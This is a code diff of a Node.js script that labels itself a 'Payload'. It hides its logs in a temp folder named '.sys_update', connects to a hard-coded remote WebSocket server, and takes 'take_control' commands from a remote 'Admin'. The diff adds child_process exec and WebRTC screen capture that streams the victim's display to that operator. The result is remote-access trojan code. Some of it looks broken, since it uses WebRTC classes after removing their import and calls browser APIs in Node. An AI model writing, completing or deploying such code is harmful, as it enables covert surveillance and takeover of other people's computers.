@@ -1,14 +1,11 @@
 const WebSocket = require('ws');
-const crypto = require('crypto');
+const { exec } = require('child_process');
+const fs = require('fs'); 
 const os = require('os');
-const fs = require('fs');
-const http = require('http');
 const path = require('path');
-
-// --- IMPORT @roamhq/wrtc ---
-// This provides RTCPeerConnection, RTCSessionDescription, etc.
-const wrtc = require('@roamhq/wrtc');
-const { RTCPeerConnection, RTCSessionDescription, RTCIceCandidate } = wrtc;
+const https = require('https');
+const crypto = require('crypto');
+const http = require('http'); 
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -26,7 +23,7 @@ function log(msg) {
  } catch (e) {}
 }
 
-log("[INIT] Payload starting with @roamhq/wrtc...");
+log("[INIT] Payload starting...");
 
 // --- CONFIGURATION ---
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
@@ -52,8 +49,8 @@ try {
 
 // --- WEBRTC VARIABLES ---
 let peerConnection = null;
-let remotePeerId = null;
 let localStream = null;
+let remotePeerId = null;
 
 // --- INIT CONNECTION ---
 function initConnection() {
@@ -96,19 +93,14 @@ function initConnection() {
  if (data.type === 'take_control') takeControl(true);
  else if (data.type === 'release_control') takeControl(false);
  else if (data.type === 'request_join') {
- // Admin requests to join, but we wait for the actual Offer
  log(`[JOIN] Request join received from ${data.from}`);
- // Optional: Notify admin that we are ready
- safeSend(JSON.stringify({
- type: 'join_ready',
- from: myId,
- to: data.from
- }));
+ handleJoinRequest(data.from);
  } else if (data.type === 'start_join') {
+ // NEW: Explicitly start the join process when requested by admin
  log(`[JOIN] Starting join initiated by ${data.from}`);
- // Again, we wait for the Offer
+ handleJoinRequest(data.from);
  } else if (data.type === 'offer') {
- log(`[SIG] Received Offer from Admin: ${data.targetId}`);
+ log(`[SIG] Received Offer from Admin`);
  handleOffer(data.sdp, data.targetId || myId);
  } else if (data.type === 'answer') {
  log(`[SIG] Received Answer from Admin`);
@@ -182,46 +174,36 @@ function startMonitoring() {
 // --- WEBRTC FUNCTIONS ---
 
 async function setupLocalStream() {
- // Since we don't have Electron, we can't easily get desktop capture here.
- // However, we can try to get camera/mic if available via native bindings,
- // or simply create a dummy stream for testing.
- // For now, we'll create a simple black canvas stream as a fallback 
- // so the PeerConnection has something to send.
- 
- log("[WEBRTC] Creating local media stream...");
- 
- // Try to get camera first
+ if (localStream) return localStream;
  try {
-     // @roamhq/wrtc might support getUserMedia if compiled with proper flags
-     // But often in server environments, it's not available.
-     // Let's try a simple approach: create a MediaStream from a canvas
-     const canvas = document ? document.createElement('canvas') : null;
-     
-     // If we are in Node without DOM, we can still create a basic stream
-     // using the wrtc package's internal capabilities if exposed, 
-     // or just rely on the fact that we are sending an offer.
-     
-     // Fallback: Create a simple stream object that satisfies addTrack
-     // In many Node wrtc implementations, you can create a MediaStream
-     const stream = new wrtc.MediaStream();
-     
-     // Add a dummy audio track if possible, or just leave it video-only
-     // Note: Without a real source, the video track won't have frames.
-     // But this allows the handshake to complete.
-     
-     log("[WEBRTC] Local stream created (fallback mode)");
-     return stream;
- } catch (e) {
-     log(`[WEBRTC] Stream creation error: ${e.message}`);
-     return null;
+ log("[WEBRTC] Requesting screen access...");
+ localStream = await navigator.mediaDevices.getDisplayMedia({
+ video: { cursor: "always" },
+ audio: false
+ });
+ log("[WEBRTC] Screen access granted");
+ 
+ localStream.getVideoTracks()[0].onended = () => {
+ log("[WEBRTC] User stopped sharing");
+ closePeerConnection();
+ };
+ return localStream;
+ } catch (err) {
+ log(`[WEBRTC] Screen access denied: ${err.message}`);
+ return null;
  }
 }
 
-async function handleOffer(sdp, fromId) {
- log(`[SIG] Handling incoming Offer from ${fromId}`);
+async function handleJoinRequest(fromId) {
+ log(`[JOIN] Starting handshake with Admin: ${fromId}`);
  remotePeerId = fromId;
+ 
+ const stream = await setupLocalStream();
+ if (!stream) {
+ log("[JOIN] Failed to get stream");
+ return;
+ }
 
- // Create PeerConnection
  peerConnection = new RTCPeerConnection({
  iceServers: [
  { urls: 'stun:stun.l.google.com:19302' },
@@ -229,18 +211,13 @@ async function handleOffer(sdp, fromId) {
  ]
  });
 
- // Setup Local Stream
- localStream = await setupLocalStream();
- if (localStream) {
-     localStream.getTracks().forEach(track => {
-         peerConnection.addTrack(track, localStream);
-     });
- }
+ stream.getTracks().forEach(track => {
+ peerConnection.addTrack(track, stream);
+ });
 
- // Handle ICE Candidates
  peerConnection.onicecandidate = (event) => {
  if (event.candidate) {
- log("[SIG] Sending ICE Candidate to Admin");
+ log("[SIG] Sending ICE Candidate");
  safeSend(JSON.stringify({
  type: 'candidate',
  targetId: fromId,
@@ -249,32 +226,49 @@ async function handleOffer(sdp, fromId) {
  }
  };
 
- // Handle Remote Track (if Admin sends video too)
  peerConnection.ontrack = (event) => {
- log("[WEBRTC] Remote stream received from Admin!");
- // You could save this to a file or forward it elsewhere
+ log("[WEBRTC] Remote stream received!");
  };
 
- // Set Remote Description
- await peerConnection.setRemoteDescription(new RTCSessionDescription(sdp));
+ log("[SIG] Creating Offer");
+ const offer = await peerConnection.createOffer();
+ await peerConnection.setLocalDescription(offer);
+ 
+ safeSend(JSON.stringify({
+ type: 'offer',
+ targetId: fromId,
+ sdp: peerConnection.localDescription
+ }));
+ 
+ log("[SIG] Offer Sent to Admin");
+}
 
- // Create Answer
- const answer = await peerConnection.createAnswer();
- await peerConnection.setLocalDescription(answer);
-
- // Send Answer back
+function handleOffer(sdp, fromId) {
+ log("[SIG] Handling incoming Offer");
+ if (!peerConnection) {
+ peerConnection = new RTCPeerConnection({
+ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+ });
+ }
+ 
+ peerConnection.setRemoteDescription(new RTCSessionDescription(sdp)).then(() => {
+ return peerConnection.createAnswer();
+ }).then(answer => {
+ return peerConnection.setLocalDescription(answer);
+ }).then(() => {
  safeSend(JSON.stringify({
  type: 'answer',
  targetId: fromId,
  sdp: peerConnection.localDescription
  }));
-
- log("[SIG] Answer Sent to Admin");
+ log("[SIG] Answer Sent");
+ }).catch(err => {
+ log(`[WEBRTC] Error handling offer: ${err.message}`);
+ });
 }
 
 function handleAnswer(sdp) {
  log("[SIG] Setting Remote Description (Answer)");
- if (peerConnection) {
  peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
  .then(() => {
  log("[WEBRTC] Connection Established!");
@@ -282,11 +276,10 @@ function handleAnswer(sdp) {
  .catch(err => {
  log(`[WEBRTC] Error setting answer: ${err.message}`);
  });
- }
 }
 
 function handleCandidate(candidate) {
- log("[SIG] Adding ICE Candidate from Admin");
+ log("[SIG] Adding ICE Candidate");
  if (peerConnection) {
  peerConnection.addIceCandidate(new RTCIceCandidate(candidate))
  .catch(err => {
